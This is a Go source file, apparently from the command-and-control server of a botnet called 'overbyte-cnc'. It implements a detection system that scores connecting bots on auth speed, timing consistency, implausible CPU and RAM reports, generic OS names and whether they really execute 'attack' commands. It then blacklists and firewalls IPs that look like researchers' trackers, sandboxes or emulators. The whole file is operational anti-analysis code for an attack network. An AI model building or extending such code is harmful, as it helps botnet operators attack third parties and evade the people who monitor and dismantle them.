package bot

import (
	"net"
	"sync"
	"time"

	"overbyte-cnc/logger"
)

const (
	MinAuthTime           = 10 * time.Millisecond
	MaxTimeVariance       = 5.0
	MaxCPUCores           = 256
	MaxRAMMB              = 1024 * 1024
	MaxAttackResponseTime = 30 * time.Second
	MinAttackResponseTime = 5 * time.Millisecond
	MinPongResponseTime   = 1 * time.Millisecond
	
	ScoreHighFrequency    = 30.0
	ScoreInstantAuth      = 25.0
	ScoreConsistentTiming = 20.0
	ScoreImpossibleCPU    = 20.0
	ScoreImpossibleRAM    = 20.0
	ScoreInstantAttack    = 15.0
	ScoreNoAttackExec     = 10.0
	ScoreGenericOS        = 5.0
	ScoreInstantPong      = 5.0
)

type ConnectionAttempt struct {
	IP            string
	Timestamp     time.Time
	AuthTime      time.Duration
}

type BlacklistEntry struct {
	IP         string
	AddedAt    time.Time
	ExpiresAt  time.Time
	Reason     string
	Score      float64
}

type DetectionSystem struct {
	attempts     map[string][]ConnectionAttempt
	attemptMutex sync.RWMutex

	suspicionScores map[string]float64
	scoreMutex      sync.RWMutex

	blacklist      map[string]*BlacklistEntry
	blacklistMutex sync.RWMutex

	thresholdScore     float64
	blacklistDuration  time.Duration
	maxAttemptsPerMin  int
	enabled            bool
	stopChan           chan struct{}

	firewall *FirewallManager
}

func NewDetectionSystem(enabled bool, thresholdScore float64, blacklistDuration time.Duration, firewall *FirewallManager) *DetectionSystem {
	ds := &DetectionSystem{
		attempts:           make(map[string][]ConnectionAttempt),
		suspicionScores:    make(map[string]float64),
		blacklist:          make(map[string]*BlacklistEntry),
		thresholdScore:     thresholdScore,
		blacklistDuration:  blacklistDuration,
		maxAttemptsPerMin:  10,
		enabled:            enabled,
		stopChan:           make(chan struct{}),
		firewall:           firewall,
	}

	if enabled {
		go ds.cleanupLoop()
	}

	return ds
}

func (ds *DetectionSystem) IsBlacklisted(addr string) bool {
	ip := extractIP(addr)
	
	ds.blacklistMutex.RLock()
	defer ds.blacklistMutex.RUnlock()

	entry, exists := ds.blacklist[ip]
	if !exists {
		return false
	}

	if time.Now().After(entry.ExpiresAt) {
		return false
	}

	return true
}

func (ds *DetectionSystem) CheckConnection(addr string, authTime time.Duration) float64 {
	if !ds.enabled {
		return 0.0
	}

	ip := extractIP(addr)
	score := 0.0

	ds.attemptMutex.Lock()
	attempts := ds.attempts[ip]
	now := time.Now()
	
	recentCount := 0
	for _, attempt := range attempts {
		if now.Sub(attempt.Timestamp) < time.Minute {
			recentCount++
		}
	}

	attempts = append(attempts, ConnectionAttempt{
		IP:        ip,
		Timestamp: now,
		AuthTime:  authTime,
	})
	ds.attempts[ip] = attempts
	ds.attemptMutex.Unlock()

	if recentCount >= ds.maxAttemptsPerMin {
		score += ScoreHighFrequency
		logger.Info("[DETECT] High connection frequency from %s: %d/min (+%.0f score)", ip, recentCount, ScoreHighFrequency)
	}

	if authTime < MinAuthTime {
		score += ScoreInstantAuth
		logger.Info("[DETECT] Instant auth response from %s: %v (+%.0f score)", ip, authTime, ScoreInstantAuth)
	}

	if len(attempts) >= 5 {
		variance := calculateTimeVariance(attempts)
		if variance < MaxTimeVariance {
			score += ScoreConsistentTiming
			logger.Info("[DETECT] Suspiciously consistent timing from %s: variance=%.2fms (+%.0f score)", ip, variance, ScoreConsistentTiming)
		}
	}

	ds.updateSuspicionScore(ip, score)
	return ds.getSuspicionScore(ip)
}

func (ds *DetectionSystem) RecordBehavior(addr string, eventType string, duration time.Duration, details map[string]interface{}) {
	if !ds.enabled {
		return
	}

	ip := extractIP(addr)
	score := 0.0

	switch eventType {
	case "attack_response":
		if duration < MinAttackResponseTime {
			score += ScoreInstantAttack
			logger.Info("[DETECT] Instant attack response from %s (+%.0f score)", ip, ScoreInstantAttack)
		}
		
		if duration > MaxAttackResponseTime {
			score += ScoreNoAttackExec
			logger.Info("[DETECT] No attack execution from %s (+%.0f score)", ip, ScoreNoAttackExec)
		}

	case "sysinfo_response":
		if details != nil {
			if cpuCores, ok := details["cpu_cores"].(uint16); ok {
				if cpuCores == 0 || cpuCores > MaxCPUCores {
					score += ScoreImpossibleCPU
					logger.Info("[DETECT] Impossible CPU cores from %s: %d (+%.0f score)", ip, cpuCores, ScoreImpossibleCPU)
				}
			}
			
			if ram, ok := details["total_ram"].(uint32); ok {
				if ram == 0 || ram > MaxRAMMB {
					score += ScoreImpossibleRAM
					logger.Info("[DETECT] Impossible RAM from %s: %dMB (+%.0f score)", ip, ram, ScoreImpossibleRAM)
				}
			}

			if osName, ok := details["os_name"].(string); ok {
				if osName == "Linux" || osName == "Unknown" || osName == "" {
					score += ScoreGenericOS
				}
			}
		}

	case "pong_response":
		if duration < MinPongResponseTime {
			score += ScoreInstantPong
		}
	}

	if score > 0 {
		ds.updateSuspicionScore(ip, score)
	}

	totalScore := ds.getSuspicionScore(ip)
	if totalScore >= ds.thresholdScore {
		ds.Blacklist(ip, "High suspicion score", totalScore)
	}
}

func (ds *DetectionSystem) updateSuspicionScore(ip string, delta float64) {
	ds.scoreMutex.Lock()
	defer ds.scoreMutex.Unlock()

	ds.suspicionScores[ip] += delta
}

func (ds *DetectionSystem) getSuspicionScore(ip string) float64 {
	ds.scoreMutex.RLock()
	defer ds.scoreMutex.RUnlock()
	
	return ds.suspicionScores[ip]
}

func (ds *DetectionSystem) Blacklist(ip string, reason string, score float64) {
	if ip == "" {
		logger.Info("[DETECT] Skipping blacklist: empty IP (reason: %s)", reason)
		return
	}

	ds.blacklistMutex.Lock()
	defer ds.blacklistMutex.Unlock()

	entry := &BlacklistEntry{
		IP:        ip,
		AddedAt:   time.Now(),
		ExpiresAt: time.Now().Add(ds.blacklistDuration),
		Reason:    reason,
		Score:     score,
	}

	ds.blacklist[ip] = entry
	logger.Info("[DETECT] BLACKLISTED: %s (reason: %s, score: %.1f)", ip, reason, score)

	if ds.firewall != nil && ds.firewall.IsEnabled() {
		ds.firewall.BlockIP(ip, reason, ds.blacklistDuration)
	}
}

func (ds *DetectionSystem) cleanupLoop() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ds.stopChan:
			return
		case <-ticker.C:
			ds.cleanup()
		}
	}
}

func (ds *DetectionSystem) cleanup() {
	now := time.Now()

	ds.attemptMutex.Lock()
	for ip, attempts := range ds.attempts {
		filtered := make([]ConnectionAttempt, 0)
		for _, attempt := range attempts {
			if now.Sub(attempt.Timestamp) < time.Hour {
				filtered = append(filtered, attempt)
			}
		}
		if len(filtered) == 0 {
			delete(ds.attempts, ip)
		} else {
			ds.attempts[ip] = filtered
		}
	}
	ds.attemptMutex.Unlock()

	ds.blacklistMutex.Lock()
	for ip, entry := range ds.blacklist {
		if now.After(entry.ExpiresAt) {
			delete(ds.blacklist, ip)
			logger.Info("[DETECT] Blacklist expired for %s", ip)
		}
	}
	ds.blacklistMutex.Unlock()

	ds.scoreMutex.Lock()
	for ip, score := range ds.suspicionScores {
		newScore := score * 0.9
		if newScore < 1.0 {
			delete(ds.suspicionScores, ip)
		} else {
			ds.suspicionScores[ip] = newScore
		}
	}
	ds.scoreMutex.Unlock()
}

func extractIP(addr string) string {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return addr
	}
	return host
}

func calculateTimeVariance(attempts []ConnectionAttempt) float64 {
	if len(attempts) < 2 {
		return 100.0
	}

	var sum float64
	for _, attempt := range attempts {
		sum += float64(attempt.AuthTime.Milliseconds())
	}
	mean := sum / float64(len(attempts))

	var varianceSum float64
	for _, attempt := range attempts {
		diff := float64(attempt.AuthTime.Milliseconds()) - mean
		varianceSum += diff * diff
	}

	return varianceSum / float64(len(attempts))
}
